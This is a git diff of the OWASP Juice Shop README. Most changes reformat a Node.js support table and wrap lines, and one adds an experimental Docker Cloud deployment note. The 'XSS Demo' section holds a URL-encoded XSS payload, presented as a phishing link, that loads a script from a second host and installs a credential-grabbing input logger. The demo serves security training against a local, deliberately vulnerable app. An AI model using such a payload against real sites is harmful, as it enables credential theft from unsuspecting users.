@@ -90,12 +90,15 @@ overview please visit the official project page:
    container
 3. Click on the _Open_ icon next to _Web Preview_ to browse to OWASP
    Juice Shop
-   
-#### Deploy to Docker Cloud
+
+#### Deploy to Docker Cloud (:microscope:)
 
 1. Click the button below and follow the instructions
 
 [![Deploy to Docker Cloud](https://files.cloud.docker.com/images/deploy-to-dockercloud.svg)](https://cloud.docker.com/stack/deploy/)
+
+> This (:microscope:) is an experimental deployment option! Your
+> feedback is appreciated at <https://gitter.im/bkimminich/juice-shop>.
 
 ### Vagrant
 
@@ -159,10 +162,10 @@ OWASP Juice Shop officially supports the following versions of
 official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
 images and packaged distributions are offered accordingly:
 
-| node.js             | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)         |
-|:--------------------|:------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------|
-| __9.x__             | __`latest`__ (current official release), `snapshot` (preview from `develop` branch) | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz`   |
-| 8.x                 |                                                                                     | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz`   |
+| node.js | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)       |
+|:--------|:------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------|
+| __9.x__ | __`latest`__ (current official release), `snapshot` (preview from `develop` branch) | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz` |
+| 8.x     |                                                                                     | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz` |
 
 ## Demo [![Heroku](https://heroku-badge.herokuapp.com/?app=juice-shop)](http://demo.owasp-juice.shop)
 
@@ -194,10 +197,17 @@ For step-by-step instructions and examples please refer to
 of our companion guide ebook.
 
 ## XSS Demo
-To show the possible impact of [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you can download this [docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file and run `docker-compose up` to start the juice-shop and the shake-logger. Assume you received and (of course) clicked
+
+To show the possible impact of
+[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
+can download this
+[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
+and run `docker-compose up` to start the juice-shop and the
+shake-logger. Assume you received and (of course) clicked
 [this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
 and login. Apart from the visual/audible effect, the attacker also
-installed [an input logger](http://localhost:8080/logger.php) to grab credentials! This could easily run on a 3rd party server in real life!
+installed [an input logger](http://localhost:8080/logger.php) to grab
+credentials! This could easily run on a 3rd party server in real life!
 
 
 ## Additional Documentation
